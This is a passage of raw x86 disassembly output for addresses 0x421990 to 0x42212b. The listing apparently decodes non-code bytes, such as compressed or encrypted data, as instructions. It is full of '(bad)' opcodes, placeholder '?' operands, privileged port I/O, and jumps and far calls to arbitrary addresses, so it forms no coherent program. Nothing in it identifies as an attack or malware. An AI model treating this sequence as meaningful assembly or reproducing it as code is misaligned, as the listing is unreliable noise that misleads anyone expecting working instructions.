  421990:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421991:	loopne 0x4219a1
  421993:	arpl   WORD PTR [edx+0x1c632d16],ax
  421999:	scas   al,BYTE PTR es:[edi]
  42199a:	xor    al,0x83
  42199c:	test   DWORD PTR [esp+eiz*4],0xea1660db
  4219a3:	sub    DWORD PTR [ebp-0x5f0182e3],edx
  4219a9:	fwait
  4219aa:	jl     0x4219ce
  4219ac:	adc    BYTE PTR [eax-0x53ac14ac],0xf
  4219b3:	mov    dh,0xa3
  4219b5:	nop
  4219b6:	pop    es
  4219b7:	or     eax,0x630e07bb
  4219bc:	test   BYTE PTR [edx],cl
  4219be:	push   0x8963ac2a
  4219c3:	imul   esp,DWORD PTR [ecx+0x18e45fcd],0x882e7238
  4219cd:	mov    edi,0x6960c790
  4219d2:	(bad)  
  4219d3:	mov    al,0xea
  4219d5:	jecxz  0x4219c4
  4219d7:	cmp    eax,0xbfe7ccd5
  4219dc:	xchg   esi,eax
  4219dd:	jmp    0xe549948e
  4219e2:	dec    ebp
  4219e3:	mov    esp,0x8796c58d
  4219e9:	dec    ebx
  4219ea:	fcomi  st,st(5)
  4219ec:	sahf   
  4219ed:	divps  xmm2,XMMWORD PTR [esi]
  4219f0:	adc    DWORD PTR [edx-0x75],ebx
  4219f3:	bound  eax,QWORD PTR [edx+esi*1+0x24]
  4219f7:	and    al,BYTE PTR [edx]
  4219f9:	lods   eax,DWORD PTR ds:[esi]
  4219fa:	pop    edx
  4219fb:	sub    al,0x37
  4219fd:	ret    
  4219fe:	cdq    
  4219ff:	inc    eax
  421a00:	in     eax,0x20
  421a02:	or     cl,BYTE PTR [eax-0x17]
  421a05:	push   ds
  421a06:	mov    ebp,0xaa0fc211
  421a0b:	cmovne eax,DWORD PTR [esi+0x6d]
  421a0f:	lds    ebx,FWORD PTR cs:[ecx+0x5995cf1a]
  421a16:	cmp    dl,cl
  421a18:	xchg   esi,eax
  421a19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a1a:	jmp    DWORD PTR [ebp-0x46d7566b]
  421a20:	mov    bl,0xcd
  421a22:	add    edx,DWORD PTR [eax-0x756c52f7]
  421a28:	in     al,dx
  421a29:	pop    edi
  421a2a:	dec    esi
  421a2b:	gs xchg ecx,eax
  421a2d:	pop    eax
  421a2e:	fldcw  WORD PTR [ebx+0xf]
  421a31:	mov    eax,0xd445fa79
  421a36:	icebp  
  421a37:	add    bl,BYTE PTR [edx+ebp*4+0x36839711]
  421a3e:	and    al,0x64
  421a40:	mov    WORD PTR [edx+eax*1-0x314047e3],?
  421a47:	push   edx
  421a48:	inc    ecx
  421a49:	test   DWORD PTR [ebx],ecx
  421a4b:	mov    ah,0x2a
  421a4d:	xor    eax,0xfeff9c23
  421a52:	push   0xffffffa8
  421a54:	push   ds
  421a55:	sub    al,0xcd
  421a57:	mov    esi,0x937b9b5e
  421a5c:	loope  0x421a73
  421a5e:	push   esp
  421a5f:	and    eax,0x4c08ae2c
  421a64:	outs   dx,DWORD PTR ds:[esi]
  421a65:	sbb    al,0xca
  421a67:	push   ebx
  421a68:	arpl   ax,si
  421a6a:	sbb    eax,esi
  421a6c:	mov    eax,0xed1bfc7e
  421a71:	cmp    eax,0x94743b6c
  421a76:	xor    BYTE PTR [esi+0x75],dl
  421a79:	and    DWORD PTR [edx-0x78],0xd6a9e712
  421a80:	mov    ds:0xc770d0ba,eax
  421a85:	xor    BYTE PTR [esi-0x4a0d177d],cl
  421a8b:	lods   al,BYTE PTR ds:[esi]
  421a8c:	cmc    
  421a8d:	test   BYTE PTR [edi+0x39],ah
  421a90:	adc    ebx,DWORD PTR [esi]
  421a92:	mov    bl,0x18
  421a94:	and    cl,BYTE PTR [edi+ebx*4-0x4b72c512]
  421a9b:	lods   eax,DWORD PTR ds:[esi]
  421a9c:	adc    eax,ebx
  421a9e:	adc    BYTE PTR [ebx+0x2c140f5],al
  421aa4:	shr    bh,0x91
  421aa7:	mov    al,0x86
  421aa9:	xchg   esp,eax
  421aaa:	add    esp,edx
  421aac:	aad    0x85
  421aae:	xor    BYTE PTR [esi],bh
  421ab0:	push   ds
  421ab1:	adc    al,0x12
  421ab3:	push   edx
  421ab4:	pop    es
  421ab5:	mov    al,ds:0x8c344363
  421aba:	or     esi,0x24
  421abd:	or     esi,edx
  421abf:	adc    BYTE PTR [ebx],bl
  421ac1:	loopne 0x421af5
  421ac3:	ret    
  421ac4:	pushf  
  421ac5:	dec    eax
  421ac6:	and    al,0x1c
  421ac8:	push   0xffffffd7
  421aca:	jmp    0x421a9e
  421acc:	cmp    al,0x6c
  421ace:	(bad)  
  421acf:	shr    BYTE PTR [edi+0x191bf53a],1
  421ad5:	and    eax,0xdd0e85d8
  421ada:	js     0x421a5f
  421adc:	in     al,dx
  421add:	fs push 0xffffffb5
  421ae0:	sub    dl,BYTE PTR [ecx]
  421ae2:	ds sub dh,cl
  421ae5:	push   ds
  421ae6:	xor    ecx,DWORD PTR [ebp-0x2b95f52c]
  421aec:	jl     0x421ad1
  421aee:	cmp    bl,BYTE PTR [edx]
  421af0:	pop    ecx
  421af1:	test   eax,0xf1f4c1bc
  421af6:	or     eax,0xd8e6d21d
  421afb:	jo     0x421ae7
  421afd:	cmp    DWORD PTR [ebx+0x301c36e1],eax
  421b03:	pusha  
  421b04:	fwait
  421b05:	in     al,dx
  421b06:	mov    fs,WORD PTR [ecx]
  421b08:	dec    esi
  421b09:	mov    BYTE PTR [esi-0x34],bh
  421b0c:	int    0x2
  421b0e:	or     al,0xd5
  421b10:	pop    eax
  421b11:	mov    edx,0xd8175bcc
  421b16:	xchg   ebp,eax
  421b17:	ins    BYTE PTR es:[edi],dx
  421b18:	cmp    eax,0x78fec869
  421b1d:	pop    edx
  421b1e:	mov    DWORD PTR [eax-0x7f],ebp
  421b21:	cmp    DWORD PTR [eax+0x23ce6806],edi
  421b27:	pop    ecx
  421b28:	lods   al,BYTE PTR ds:[esi]
  421b29:	add    esp,DWORD PTR [edx]
  421b2b:	repnz imul esi,DWORD PTR [edi+0x26],0x77
  421b30:	mov    dl,0x28
  421b32:	sub    BYTE PTR [edi],0x8d
  421b35:	mov    ah,0xf3
  421b37:	push   es
  421b38:	xor    bl,BYTE PTR [eax]
  421b3a:	push   0xc77fb28
  421b3f:	adc    cl,bl
  421b41:	fstp   TBYTE PTR [edi-0x3]
  421b44:	shl    DWORD PTR [ebx],cl
  421b46:	mov    ds:0xf5d14781,al
  421b4b:	add    al,0xc5
  421b4d:	std    
  421b4e:	dec    esp
  421b4f:	fnstenv [esi-0xbf3799e]
  421b55:	push   ecx
  421b56:	xchg   DWORD PTR [esi-0xd],ebx
  421b59:	fstp   TBYTE PTR [ecx+0x61]
  421b5c:	jmp    0x12a5:0x7564b9f3
  421b63:	(bad)  
  421b64:	rol    ah,cl
  421b66:	jmp    0x8ea9:0x31cab019
  421b6d:	mov    edi,0x39c45b23
  421b72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b73:	retf   
  421b74:	jne    0x421b73
  421b76:	pushf  
  421b77:	cmp    DWORD PTR [ebx],ecx
  421b79:	push   esi
  421b7a:	jmp    0x421b54
  421b7c:	jge    0x421b17
  421b7e:	push   edx
  421b7f:	add    eax,0x7e1b2c57
  421b84:	jg     0x421b7a
  421b86:	call   0xd49db557
  421b8b:	dec    edi
  421b8c:	jne    0x421b92
  421b8e:	(bad)  
  421b8f:	jle    0x421bc7
  421b91:	mov    dl,0xfd
  421b93:	call   FWORD PTR [esp+eiz*4+0x6e2d5069]
  421b9a:	mov    cl,0xd9
  421b9c:	push   ds
  421b9d:	push   0xce5c648b
  421ba2:	mov    ecx,0x32926828
  421ba7:	jle    0x421c02
  421ba9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421baa:	dec    edx
  421bab:	jae    0x421be0
  421bad:	pusha  
  421bae:	std    
  421baf:	push   ds
  421bb0:	fistp  QWORD PTR [ecx+0x72e54286]
  421bb6:	loope  0x421ba1
  421bb8:	xchg   esi,eax
  421bb9:	jb     0x421b94
  421bbb:	leave  
  421bbc:	clc    
  421bbd:	add    ebp,esi
  421bbf:	dec    esp
  421bc0:	inc    ecx
  421bc1:	cmp    bh,BYTE PTR [edi-0x54]
  421bc4:	mov    bl,0xad
  421bc6:	sub    DWORD PTR [eax+0xf],ecx
  421bc9:	scas   eax,DWORD PTR es:[edi]
  421bca:	mov    ebp,0x8500fb03
  421bcf:	es inc esi
  421bd1:	inc    esi
  421bd2:	cli    
  421bd3:	pop    ecx
  421bd4:	and    DWORD PTR [edi-0x2f7d7b33],esi
  421bda:	es out 0x66,al
  421bdd:	dec    ebp
  421bde:	pop    ds
  421bdf:	in     eax,dx
  421be0:	jo     0x421b83
  421be2:	sub    eax,0xf039ffd7
  421be7:	mov    edi,0xd5323e18
  421bec:	rcl    BYTE PTR [edx],1
  421bee:	xchg   edi,eax
  421bef:	mov    BYTE PTR [ebx-0x5b],ch
  421bf2:	lahf   
  421bf3:	(bad)  
  421bf4:	rcl    edi,cl
  421bf6:	dec    edi
  421bf7:	pop    ebp
  421bf8:	jmp    0xefa2:0x441cfd0e
  421bff:	or     ebx,DWORD PTR [ebx-0x11852178]
  421c05:	xor    eax,0xf0776203
  421c0a:	push   esi
  421c0b:	inc    ebx
  421c0c:	pop    edx
  421c0d:	pop    ecx
  421c0e:	pop    edi
  421c0f:	pop    ecx
  421c10:	push   edi
  421c11:	dec    edi
  421c12:	mov    fs,WORD PTR [ecx+0x18ae972]
  421c18:	jne    0x421c3c
  421c1a:	or     BYTE PTR [ebx+0x6880001],ch
  421c20:	add    BYTE PTR [eax],al
  421c22:	mov    esp,0xd72d3a29
  421c27:	push   ds
  421c28:	sbb    eax,0x904921e8
  421c2d:	aad    0x20
  421c2f:	mov    ah,bl
  421c31:	out    0x8b,eax
  421c33:	sub    al,0xbc
  421c35:	or     BYTE PTR [ebx-0x5afe4c38],0x64
  421c3c:	jo     0x421c93
  421c3e:	out    0x3b,al
  421c40:	shr    BYTE PTR [esi-0x12],0xc7
  421c44:	mov    eax,0x481348ff
  421c49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c4a:	xchg   DWORD PTR [ebp+edx*8-0x6c],esp
  421c4e:	cdq    
  421c4f:	mov    esi,0x8bab131
  421c54:	std    
  421c55:	repz push ds
  421c57:	mov    dh,0x47
  421c59:	test   al,0xf7
  421c5b:	mov    eax,0xf653b6d6
  421c60:	jbe    0x421c31
  421c62:	lods   eax,DWORD PTR ds:[esi]
  421c63:	std    
  421c64:	clc    
  421c65:	pop    edi
  421c66:	cmc    
  421c67:	add    bl,bl
  421c69:	shld   DWORD PTR [esp+edx*4+0x6e],edx,0x82
  421c6f:	jae    0x421c5d
  421c71:	mov    ch,0xa1
  421c73:	(bad)  
  421c74:	rol    DWORD PTR [eax+0x78],1
  421c77:	call   0x47c2:0xce7042e5
  421c7e:	jbe    0x421ce2
  421c80:	sub    edx,DWORD PTR [edi]
  421c82:	arpl   bx,bp
  421c84:	jmp    0x421cd1
  421c86:	ins    BYTE PTR es:[edi],dx
  421c87:	ja     0x421ce7
  421c89:	jnp    0x421ca8
  421c8b:	sbb    eax,0x53f77a1c
  421c90:	lock mov ch,0xb3
  421c93:	xchg   esp,eax
  421c94:	rol    esi,cl
  421c96:	out    0xe4,al
  421c98:	addr16 out 0x9b,al
  421c9b:	push   esi
  421c9c:	es lock cmp dh,ch
  421ca0:	sahf   
  421ca1:	dec    edx
  421ca2:	sub    al,0xcd
  421ca4:	aaa    
  421ca5:	push   cs
  421ca6:	xor    ebx,DWORD PTR [eax+eiz*2]
  421ca9:	fs jne 0x421d03
  421cac:	adc    BYTE PTR [edx-0x3d],dh
  421caf:	sbb    WORD PTR [ebx+0x47881af7],bx
  421cb6:	mov    ch,0xbc
  421cb8:	scas   al,BYTE PTR es:[edi]
  421cb9:	(bad)  
  421cba:	repnz pop edi
  421cbc:	and    al,0x60
  421cbe:	pop    ecx
  421cbf:	loopne 0x421c8f
  421cc1:	pop    edx
  421cc2:	cmc    
  421cc3:	fbstp  TBYTE PTR [ebx+eiz*1-0x60]
  421cc7:	(bad)  
  421cc8:	stos   DWORD PTR es:[edi],eax
  421cc9:	mov    DWORD PTR [ebx],0xb7c8fec8
  421ccf:	ins    BYTE PTR es:[edi],dx
  421cd0:	lock fwait
  421cd2:	sti    
  421cd3:	sar    DWORD PTR [esi],cl
  421cd5:	mov    edx,DWORD PTR [ebx-0x6f]
  421cd8:	push   esp
  421cd9:	or     BYTE PTR [esi+edx*8+0xe14bb92],dh
  421ce0:	mov    edi,0x4a3e6c36
  421ce5:	aad    0x27
  421ce7:	pusha  
  421ce8:	adc    cl,BYTE PTR fs:[eax]
  421ceb:	popa   
  421cec:	sub    dh,al
  421cee:	fidivr DWORD PTR [ecx-0x5a]
  421cf1:	mov    ch,0x85
  421cf3:	cld    
  421cf4:	shl    DWORD PTR [ecx],cl
  421cf6:	or     BYTE PTR [ebx-0x26015c49],ah
  421cfc:	push   0x1d21278a
  421d01:	fwait
  421d02:	pop    ebp
  421d03:	dec    ebx
  421d04:	lds    edi,FWORD PTR [ecx+edx*4+0x45735142]
  421d0b:	and    al,0x14
  421d0d:	jge    0x421d41
  421d0f:	jmp    0xd3abe20a
  421d14:	mov    WORD PTR [eax],?
  421d16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d17:	jp     0x421cbd
  421d19:	cli    
  421d1a:	hlt    
  421d1b:	sbb    DWORD PTR [eax-0x15],esp
  421d1e:	mov    esp,0x15d254a9
  421d23:	call   0x847a83ad
  421d28:	push   eax
  421d29:	call   0x6f67:0x5e7de1b0
  421d30:	sbb    eax,0xca5ccf8
  421d35:	dec    edx
  421d36:	mov    dh,0xe6
  421d38:	sub    ebp,DWORD PTR [ecx-0x6]
  421d3b:	jge    0x421d5d
  421d3d:	and    BYTE PTR [ecx-0x5c],bl
  421d40:	sub    al,0x0
  421d42:	lods   eax,DWORD PTR ds:[esi]
  421d43:	xchg   edx,eax
  421d44:	sti    
  421d45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d46:	inc    ebx
  421d47:	and    BYTE PTR [eax+0xa],dh
  421d4a:	pop    ss
  421d4b:	rcl    DWORD PTR [edi+0x16],cl
  421d4e:	xor    BYTE PTR [edx],dl
  421d50:	xchg   ebx,eax
  421d51:	ss push edx
  421d53:	fst    DWORD PTR [esi-0x2f]
  421d56:	test   al,0x53
  421d58:	nop
  421d59:	inc    ebx
  421d5a:	arpl   WORD PTR [ebx-0x4a3ce1ee],cx
  421d60:	mov    ecx,0x16d3177
  421d65:	fcom   DWORD PTR [ebx+ecx*4-0x7b]
  421d69:	dec    ebp
  421d6a:	mov    cl,BYTE PTR gs:[ebx+0x1cc5572c]
  421d71:	int    0x9
  421d73:	out    dx,al
  421d74:	and    ah,cl
  421d76:	cdq    
  421d77:	dec    ebx
  421d78:	push   esp
  421d79:	cs nop
  421d7b:	mov    ebx,0xbc56e096
  421d80:	outs   dx,BYTE PTR ds:[esi]
  421d81:	(bad)  
  421d82:	lock sahf 
  421d84:	fsub   DWORD PTR [esi-0x14c5c8d]
  421d8a:	pop    ecx
  421d8b:	into   
  421d8c:	stos   DWORD PTR es:[edi],eax
  421d8d:	scas   eax,DWORD PTR es:[edi]
  421d8e:	imul   edi,ebx,0x5ea8bd06
  421d94:	sub    bh,bh
  421d96:	dec    esi
  421d97:	addr16 mov dh,0x2f
  421d9a:	adc    edi,DWORD PTR [edx]
  421d9c:	xlat   BYTE PTR ds:[ebx]
  421d9d:	mov    bh,0xe8
  421d9f:	mov    esp,0xbc882ec7
  421da4:	push   edi
  421da5:	adc    edx,DWORD PTR [edi+edi*1+0x2eb09bab]
  421dac:	push   0x7fb79c65
  421db1:	test   al,0x9f
  421db3:	mov    ch,0xe3
  421db5:	cld    
  421db6:	scas   eax,DWORD PTR es:[edi]
  421db7:	call   0xbd9e:0xbadf329d
  421dbe:	sti    
  421dbf:	pop    es
  421dc0:	repnz pop es
  421dc2:	std    
  421dc3:	test   al,0xc7
  421dc5:	stc    
  421dc6:	xlat   BYTE PTR ds:[ebx]
  421dc7:	gs mov ebp,0xdda92fa8
  421dcd:	bound  esp,QWORD PTR [edi]
  421dcf:	test   eax,0x366ba211
  421dd4:	fdivr  st,st(1)
  421dd6:	sbb    ebx,ebp
  421dd8:	and    DWORD PTR [esi+0x7f],edx
  421ddb:	sub    ebx,DWORD PTR ds:0xd17594f
  421de1:	mov    ebp,0x9a610c08
  421de6:	pop    ss
  421de7:	and    cl,al
  421de9:	out    0xa7,eax
  421deb:	xchg   ebx,eax
  421dec:	jecxz  0x421dd6
  421dee:	mov    al,0xb2
  421df0:	lock dec ebp
  421df2:	pop    edx
  421df3:	nop
  421df4:	and    al,0x30
  421df6:	dec    ebx
  421df7:	jl     0x421df5
  421df9:	fdivr  DWORD PTR [ecx+0x454896fb]
  421dff:	dec    eax
  421e00:	inc    edi
  421e01:	add    al,0xa8
  421e03:	mov    BYTE PTR [edx+0x29],al
  421e06:	repnz cmps DWORD PTR gs:[esi],DWORD PTR es:[edi]
  421e09:	add    BYTE PTR [eax],dh
  421e0b:	or     bh,dl
  421e0d:	in     eax,0xaa
  421e0f:	out    0x0,eax
  421e11:	inc    esi
  421e12:	sub    BYTE PTR [ecx],al
  421e14:	hlt    
  421e15:	xor    ebp,DWORD PTR [edi+eiz*1]
  421e18:	nop
  421e19:	in     al,dx
  421e1a:	mov    DWORD PTR [ecx],ebx
  421e1c:	jp     0x421de9
  421e1e:	ins    BYTE PTR es:[edi],dx
  421e1f:	push   cs
  421e20:	push   edi
  421e21:	mov    DWORD PTR [ebp+0x53cef830],edx
  421e27:	cwde   
  421e28:	pusha  
  421e29:	sbb    BYTE PTR [ecx+0x36],0x6f
  421e2d:	sub    BYTE PTR [esi+0x1],bh
  421e30:	inc    ebp
  421e31:	test   al,0xb1
  421e33:	stc    
  421e34:	fimul  WORD PTR [edi-0x55d69b26]
  421e3a:	or     DWORD PTR [eax+eiz*2-0x58c159f0],ebx
  421e41:	fldcw  WORD PTR [esi+edx*2+0x1dbaa4e8]
  421e48:	aaa    
  421e49:	push   0x62
  421e4b:	into   
  421e4c:	sbb    eax,0xffffffe8
  421e4f:	mov    ch,0xab
  421e51:	xchg   esp,eax
  421e52:	cmc    
  421e53:	adc    eax,0x1ed4413b
  421e58:	add    eax,0xccf41978
  421e5d:	mov    fs,WORD PTR [ebx+0x27]
  421e60:	xor    edx,DWORD PTR [edi+0x187887b6]
  421e66:	pop    ecx
  421e67:	sub    ch,dh
  421e69:	xchg   ebp,eax
  421e6a:	dec    edi
  421e6b:	mov    ebx,edi
  421e6d:	inc    ebx
  421e6e:	jae    0x421e61
  421e70:	push   edx
  421e71:	div    dh
  421e73:	or     edx,esi
  421e75:	jns    0x421e16
  421e77:	jl     0x421e54
  421e79:	fstp   TBYTE PTR [edx]
  421e7b:	mov    al,0x19
  421e7d:	push   esi
  421e7e:	popf   
  421e7f:	test   eax,0xdcc65c85
  421e84:	cmp    edi,edx
  421e86:	scas   al,BYTE PTR es:[edi]
  421e87:	mov    ebp,0x14f29ca6
  421e8c:	inc    eax
  421e8d:	push   ds
  421e8e:	cld    
  421e8f:	imul   BYTE PTR [ebx-0x5c8e8943]
  421e95:	pop    edi
  421e96:	imul   eax,DWORD PTR [edi+0x29d43fe8],0x6a
  421e9d:	push   ss
  421e9e:	xor    dl,BYTE PTR [ebx+edi*1-0x5d]
  421ea2:	inc    ecx
  421ea3:	mov    BYTE PTR [ecx],dh
  421ea5:	pop    edi
  421ea6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ea7:	ins    BYTE PTR es:[edi],dx
  421ea8:	sbb    eax,0x916cb75a
  421ead:	int    0xa7
  421eaf:	mov    eax,DWORD PTR [eax+ebx*8+0x4e]
  421eb3:	dec    edx
  421eb4:	sub    DWORD PTR [edi+edx*8+0x24],eax
  421eb8:	fimul  DWORD PTR [ebx-0x6]
  421ebb:	cmp    BYTE PTR [ebp-0x3],ah
  421ebe:	xchg   ebx,eax
  421ebf:	cmp    BYTE PTR [edi+0x3d],bh
  421ec2:	sub    al,0x7d
  421ec4:	xor    ch,BYTE PTR [edi]
  421ec6:	and    eax,0xa5efd803
  421ecb:	and    al,0x12
  421ecd:	fwait
  421ece:	adc    eax,0xd5b1b05
  421ed3:	outs   dx,DWORD PTR ds:[esi]
  421ed4:	mov    WORD PTR [edi],?
  421ed6:	push   es
  421ed7:	ins    DWORD PTR es:[edi],dx
  421ed8:	std    
  421ed9:	test   al,0x58
  421edb:	lahf   
  421edc:	sub    BYTE PTR [edx+edi*2],cl
  421edf:	pop    ebp
  421ee0:	enter  0x877f,0x91
  421ee4:	das    
  421ee5:	outs   dx,DWORD PTR ds:[esi]
  421ee6:	scas   eax,DWORD PTR es:[edi]
  421ee7:	aaa    
  421ee8:	lods   al,BYTE PTR ds:[esi]
  421ee9:	in     eax,0xf7
  421eeb:	cli    
  421eec:	stos   BYTE PTR es:[edi],al
  421eed:	sub    eax,0x4f004426
  421ef2:	xor    edx,DWORD PTR [esi]
  421ef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ef5:	ds xchg edi,eax
  421ef7:	stos   DWORD PTR es:[edi],eax
  421ef8:	arpl   bx,di
  421efa:	fs (bad) 
  421efc:	xchg   ecx,eax
  421efd:	les    ebp,FWORD PTR [eax]
  421eff:	(bad)  
  421f00:	xchg   ebp,eax
  421f01:	fisttp QWORD PTR [esi+0x4]
  421f04:	xlat   BYTE PTR ds:[ebx]
  421f05:	shl    BYTE PTR [edi],cl
  421f07:	inc    ecx
  421f08:	inc    esp
  421f09:	clc    
  421f0a:	inc    DWORD PTR [edi]
  421f0c:	cmp    BYTE PTR [edi],dl
  421f0e:	xor    ecx,DWORD PTR [ebp+0x28eb4519]
  421f14:	add    eax,0x8a6d30a
  421f19:	push   eax
  421f1a:	(bad)  
  421f1b:	xor    dh,BYTE PTR [esi-0x1d]
  421f1e:	popf   
  421f1f:	pop    esi
  421f20:	or     eax,0x77066c51
  421f26:	lods   eax,DWORD PTR ds:[esi]
  421f27:	cmp    edi,DWORD PTR [esi-0x4f]
  421f2a:	adc    dh,0x74
  421f2d:	repz adc eax,0x58636b44
  421f33:	call   0x89f95be6
  421f38:	call   0xfe216a4b
  421f3d:	(bad)  
  421f3e:	call   0x154626dc
  421f43:	outs   dx,DWORD PTR ds:[esi]
  421f44:	mov    bl,BYTE PTR [edx-0x6d]
  421f47:	and    BYTE PTR [ebx],0x14
  421f4a:	retw   0x6967
  421f4e:	bound  ebp,QWORD PTR [ecx+0x24]
  421f51:	xor    ch,BYTE PTR [edx+0x5d]
  421f54:	sub    DWORD PTR [esi+ebx*1-0x72d4f44d],ecx
  421f5b:	dec    ebp
  421f5c:	popa   
  421f5d:	or     bl,dl
  421f5f:	push   ss
  421f60:	leave  
  421f61:	mov    dh,0x6d
  421f63:	xchg   DWORD PTR [ecx],edi
  421f65:	or     eax,DWORD PTR [eax+0x53264cca]
  421f6b:	xchg   ebp,eax
  421f6c:	add    bl,BYTE PTR [edi+0x79]
  421f6f:	inc    ecx
  421f70:	inc    edx
  421f71:	sti    
  421f72:	daa    
  421f73:	fsubr  QWORD PTR [ebx-0x7e]
  421f76:	popa   
  421f77:	mov    ah,0x44
  421f79:	les    ecx,FWORD PTR [edi]
  421f7b:	adc    DWORD PTR ds:0xce6d4ce7,ecx
  421f81:	outs   dx,BYTE PTR ds:[si]
  421f83:	mov    al,ds:0xf3db5a19
  421f88:	in     al,0x5b
  421f8a:	rol    DWORD PTR [ecx+0x2ba4305d],0xb6
  421f91:	mov    ecx,0x31a3802e
  421f96:	mov    ecx,0x6015f771
  421f9b:	mov    bl,0x3
  421f9d:	loopne 0x421f6a
  421f9f:	jmp    0xf1aa:0x3eafc419
  421fa6:	mov    eax,ds:0x71aaf25
  421fac:	cdq    
  421fad:	sti    
  421fae:	lea    esi,[ecx+0x5a5d5e85]
  421fb4:	mov    DWORD PTR [esi+0x1cc12539],ebx
  421fba:	call   0xb6da2a2c
  421fbf:	sbb    eax,0x413f3add
  421fc4:	addr16 in al,0x4b
  421fc7:	and    eax,0xcf553816
  421fcc:	sub    BYTE PTR [ecx],dl
  421fce:	pop    ecx
  421fcf:	sbb    BYTE PTR [edi+0x95666cf],ch
  421fd5:	pushf  
  421fd6:	jg     0x422002
  421fd8:	rcl    BYTE PTR [ecx+0x476d8b95],cl
  421fde:	leave  
  421fdf:	sbb    DWORD PTR es:[edx-0x406dcdf9],ebp
  421fe6:	daa    
  421fe7:	(bad)  
  421fe8:	cmc    
  421fe9:	mul    DWORD PTR [ebx+0x1fadbf03]
  421fef:	sub    eax,0xff34c2bf
  421ff4:	mov    edi,DWORD PTR [edx+eax*2-0x7e9c4353]
  421ffb:	inc    esp
  421ffc:	jo     0x421ff4
  421ffe:	pmuludq mm5,QWORD PTR [edi+0x71]
  422002:	test   al,0x3c
  422004:	sti    
  422005:	push   edx
  422006:	pop    esi
  422007:	addr16 popf 
  422009:	mov    DWORD PTR [ecx-0x64],edx
  42200c:	in     al,0x95
  42200e:	inc    edi
  42200f:	loope  0x421ffc
  422011:	or     al,0x63
  422013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422014:	pop    ss
  422015:	push   esi
  422016:	cmp    eax,0x74c646ac
  42201b:	mov    bl,0x8f
  42201d:	js     0x422015
  42201f:	test   DWORD PTR [edx-0x45],ecx
  422022:	dec    edi
  422023:	lds    edx,FWORD PTR [edx+0x500e0db9]
  422029:	pop    eax
  42202a:	aam    0x5c
  42202c:	icebp  
  42202d:	mov    al,0x55
  42202f:	les    eax,FWORD PTR [esp+esi*8]
  422032:	or     esi,esi
  422034:	mov    ds:0xc2fc3336,eax
  422039:	jne    0x422049
  42203b:	int    0xde
  42203d:	xchg   esi,eax
  42203e:	popf   
  42203f:	jo     0x422096
  422041:	sahf   
  422042:	frstor [edx]
  422044:	neg    BYTE PTR [esi+esi*1+0x2d]
  422048:	in     eax,0x97
  42204a:	or     ah,BYTE PTR [esi-0x19e84698]
  422050:	push   edi
  422051:	ret    0x915d
  422054:	iret   
  422055:	sbb    edi,DWORD PTR [eax+0x9]
  422058:	clc    
  422059:	pop    ds
  42205a:	and    DWORD PTR [ebx],0x4b
  42205d:	mov    dl,BYTE PTR [edx+0x6e8baf60]
  422063:	fst    DWORD PTR [ebx+0x61]
  422066:	je     0x4220d4
  422068:	push   ss
  422069:	aad    0x7b
  42206b:	repz enter 0x7277,0xf1
  422070:	sbb    ch,cl
  422072:	repnz xor esi,edx
  422075:	sar    DWORD PTR [ebx+ebp*1],cl
  422078:	jno    0x4220b1
  42207a:	in     eax,0x4e
  42207c:	and    eax,0xe9fa9eeb
  422081:	das    
  422082:	sbb    BYTE PTR [eax],al
  422084:	jae    0x42200f
  422086:	pop    edx
  422087:	jne    0x422041
  422089:	dec    edx
  42208a:	test   eax,0x6b21987c
  42208f:	adc    al,BYTE PTR [esi-0x55]
  422092:	add    esp,DWORD PTR [ebp+esi*8-0x6c6c4c97]
  422099:	push   ebx
  42209a:	imul   ecx
  42209c:	test   eax,0x521454f8
  4220a1:	out    0x54,al
  4220a3:	mov    DWORD PTR [ecx],ecx
  4220a5:	std    
  4220a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220a7:	stos   BYTE PTR es:[edi],al
  4220a8:	in     eax,dx
  4220a9:	out    dx,eax
  4220aa:	sub    al,0x34
  4220ac:	push   esp
  4220ad:	jns    0x422032
  4220af:	inc    ebx
  4220b0:	fcomp  DWORD PTR [esi+0x40]
  4220b3:	mov    ds:0xe7014827,eax
  4220b8:	shl    DWORD PTR [ecx-0x5d45fcfc],cl
  4220be:	mov    BYTE PTR [edi-0x59],0x4d
  4220c2:	inc    ebp
  4220c3:	mov    dl,0x2
  4220c5:	ds pop esp
  4220c7:	sub    ch,dl
  4220c9:	pop    ebp
  4220ca:	push   ecx
  4220cb:	js     0x4220e4
  4220cd:	pop    eax
  4220ce:	inc    edx
  4220cf:	mov    dl,0x8b
  4220d1:	mov    cl,0xd3
  4220d3:	pop    edi
  4220d4:	mov    bh,0xe4
  4220d6:	sahf   
  4220d7:	adc    al,0xb9
  4220d9:	mov    ah,0x2f
  4220db:	lods   al,BYTE PTR ds:[esi]
  4220dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220dd:	aam    0x61
  4220df:	cwd    
  4220e1:	ins    DWORD PTR es:[edi],dx
  4220e2:	cli    
  4220e3:	mov    bh,0xaa
  4220e5:	jo     0x422166
  4220e7:	inc    edi
  4220e8:	dec    esi
  4220e9:	aad    0x7b
  4220eb:	popa   
  4220ec:	pop    ss
  4220ed:	push   edi
  4220ee:	inc    ebx
  4220ef:	inc    ebp
  4220f0:	push   cs
  4220f1:	mov    bl,0x5e
  4220f3:	int    0xdc
  4220f5:	repz and bl,BYTE PTR [ecx]
  4220f8:	mov    BYTE PTR [ecx+0x7e],al
  4220fb:	adc    ch,bl
  4220fd:	xor    eax,0xc89f9bfa
  422102:	or     DWORD PTR [ebp+0x55caee0a],0xffffffe7
  422109:	and    eax,0xf0300596
  42210e:	pop    esp
  42210f:	mov    es,WORD PTR [esi-0x19a78038]
  422115:	repz (bad) 
  422117:	add    BYTE PTR [ebx-0x62],dl
  42211a:	adc    BYTE PTR [eax+0x56cae906],ah
  422120:	scas   eax,DWORD PTR es:[edi]
  422121:	loopne 0x4220fe
  422123:	push   esp
  422124:	inc    edi
  422125:	ror    BYTE PTR [esi+0x35],0x80
  422129:	sub    edi,ecx
  42212b:	dec    eax
